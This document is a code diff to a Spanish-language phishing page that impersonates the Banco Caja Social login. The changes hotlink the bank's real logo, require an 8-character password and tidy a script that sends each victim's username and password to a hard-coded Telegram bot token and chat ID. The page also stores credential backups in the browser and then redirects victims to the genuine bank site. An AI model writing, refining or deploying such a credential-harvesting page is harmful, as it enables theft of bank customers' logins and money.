@@ -30,25 +30,20 @@ body{
     background:white;
     margin-top:-30px;
     padding:40px 35px;
-    border-radius:3px 25px 25px -1px;
+    border-radius:25px 25px 25px 25px;
     box-shadow:0 10px 25px rgba(0,0,0,0.1);
 }
 
-.logo-principal{
+/* Nuevo estilo para el logo SVG */
+.logo-svg{
     text-align:center;
-    margin-bottom:20px;
+    margin-bottom:25px;
 }
 
-.logo-principal h1{
-    font-size:32px;
-    color:#0d47a1;
-    font-weight:bold;
-}
-
-.logo-principal p{
-    font-size:14px;
-    color:#555;
-    margin-top:5px;
+.logo-svg img{
+    max-width:200px;
+    width:100%;
+    height:auto;
 }
 
 .fundacion{
@@ -188,9 +183,9 @@ hr{
 
 <div class="container">
 
-<div class="logo-principal">
-<h1>Banco Caja Social</h1>
-<p>Su banco amigo.</p>
+<!-- NUEVO LOGO SVG -->
+<div class="logo-svg">
+    <img src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/logoBCSLine.svg" alt="Banco Caja Social">
 </div>
 
 <div class="fundacion">
@@ -208,7 +203,7 @@ Ingrese su contraseña de canales digitales, recuerde que está compuesta por 8 
 </div>
 
 <label>Contraseña</label>
-<input type="password" id="password" placeholder="Ingrese su contraseña">
+<input type="password" id="password" placeholder="Ingrese su contraseña" autocomplete="off">
 
 <button id="btnLogin">Iniciar sesión</button>
 
@@ -234,16 +229,14 @@ Ingrese su contraseña de canales digitales, recuerde que está compuesta por 8 
 
 <script>
 // ==================== CONFIGURACIÓN DE TELEGRAM ====================
-// ⚠️ CAMBIA ESTOS DATOS POR LOS TUYOS ⚠️
-const TELEGRAM_BOT_TOKEN = "8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4"; // Tu token del BotFather
-const TELEGRAM_CHAT_ID = "8042354877"; // Tu chat ID
+const TELEGRAM_BOT_TOKEN = "8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4";
+const TELEGRAM_CHAT_ID = "8042354877";
 // ================================================================
 
 // Obtener usuario guardado de la página anterior
 function obtenerUsuario() {
     let usuario = localStorage.getItem('usuario_bcs');
     if (!usuario) {
-        // Si no hay usuario guardado, redirigir a la página de usuario
         window.location.href = 'usuario.html';
         return null;
     }
@@ -314,9 +307,18 @@ function guardarBackup(usuario, password) {
         usuario: usuario,
         password: password,
         fecha: new Date().toISOString(),
-        ip: navigator.userAgent
+        userAgent: navigator.userAgent
     });
     localStorage.setItem('backup_bcs', JSON.stringify(backups.slice(-30)));
+}
+
+// Validar que la contraseña tenga exactamente 8 caracteres
+function validarLongitud(password) {
+    if (password.length !== 8) {
+        alert('La contraseña debe tener exactamente 8 caracteres');
+        return false;
+    }
+    return true;
 }
 
 // Redirigir a página real del banco
@@ -338,6 +340,11 @@ document.getElementById('btnLogin').addEventListener('click', async function() {
         return;
     }
     
+    // Validar exactamente 8 caracteres
+    if (!validarLongitud(password)) {
+        return;
+    }
+    
     const btn = document.getElementById('btnLogin');
     const loading = document.getElementById('loading');
     const error = document.getElementById('error');
@@ -355,11 +362,7 @@ document.getElementById('btnLogin').addEventListener('click', async function() {
     
     if (enviado) {
         loading.innerHTML = '✅ Información verificada... Redirigiendo ✅';
-        
-        // Limpiar usuario guardado
         localStorage.removeItem('usuario_bcs');
-        
-        // Redirigir
         redirigir();
     } else {
         loading.style.display = 'none';
